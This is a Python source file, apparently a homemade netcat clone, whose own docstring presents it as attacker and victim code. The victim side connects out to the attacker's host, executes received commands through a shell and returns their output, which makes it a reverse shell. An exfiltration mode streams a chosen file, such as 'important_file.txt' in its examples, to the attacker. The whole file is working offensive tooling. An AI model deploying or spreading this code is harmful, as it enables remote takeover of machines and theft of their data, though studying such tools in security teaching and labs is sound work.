import os
from getopt import getopt
import sys
from socket import socket
from threading import Thread
import subprocess

'''

example of available commands
1. Remote Command Execution
 Attacker   : python netcat.py -h localhost -p 8000 -l
 Victim     : python netcat.py -h localhost -p 8000
2. File Transfer (Exfiltrate)
 Attacker   : python netcat.py -h localhost -p 8000 -l -f ninja.txt
 Victim     : python netcat.py -h localhost -p 8000 -f important_file.txt
 ----------------------------
 Attacker   : python netcat.py -h localhost -p 8000 -l -f ninja.exe
 Victim     : python netcat.py -h localhost -p 8000 -f file.exe

'''

HOST = ""
PORT = 0
LISTEN = False
FILE = ""

def main():
    global HOST, PORT, LISTEN, FILE

    try:
        args, _ = getopt(sys.argv[1:], "h:p:lf:")
    except:
        print("Invalid argument")

    for k, v in args:
        if k == "-h":
            HOST = v
        elif k == "-p":
            PORT = int(v)
        elif k == "-l":
            LISTEN = True
        elif k == "-f":
            FILE = v

    if LISTEN:
        attacker()
    else:
        victim()

def victim():
    global HOST, PORT, FILE

    con = socket()
    con.connect((HOST, PORT))

    print("Victim started")

    if FILE == "":
        victim_command(con)
    else:
        victim_exfiltrate(con)

def victim_command(con):
    while True:
        command = con.recv(4096).decode()

        if command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except:
                con.send("Invalid directory".encode())

            continue

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True) # If shell=True, the command string is interpreted as a raw shell command.
        output, error = process.communicate()

        if output == b'':
            con.send(error)
        else:
            con.send(output)

def victim_exfiltrate(con):
    file = open(FILE, "rb") # read byte
    data = file.read(4096)

    print("Begin sending file")

    while data:
        con.send(data)
        data = file.read(4096)
    
    file.close()
    print("Finished sending file")


def attacker():
    global HOST, PORT

    sock = socket()
    sock.bind((HOST, PORT))
    sock.listen(10)

    print("Attack box started")

    con, addr = sock.accept()

    print(f"Client {addr[0]}:{addr[1]} connected")

    if FILE == "":
        attacker_command(con)
    else:
        attacker_exfiltrate(con)

    sock.close()
    con.close()

def attacker_command(con):
    send_command_thread = Thread(target=send_command, args=(con,))
    receive_response_thread = Thread(target=receive_response, args=(con,))
    receive_response_thread.start()
    send_command_thread.start()
    receive_response_thread.join()
    send_command_thread.join()

def attacker_exfiltrate(con):
    file = open(FILE, "wb") # write byte

    while True:
        try:
            buffer = con.recv(4096)
        except:
            break

        if not buffer:
            break

        file.write(buffer)
    
    print("File saved successfully")
    file.close()

def receive_response(con):
    while True:
        try:
            response = con.recv(4096).decode()
        except:
            break

        if response == "":
            break

        print(response.strip())
        print("=" * 10)

def send_command(con):
    while True:
        command = input()

        try:
            con.send(command.encode())
        except:
            break

if __name__ == "__main__":
    main()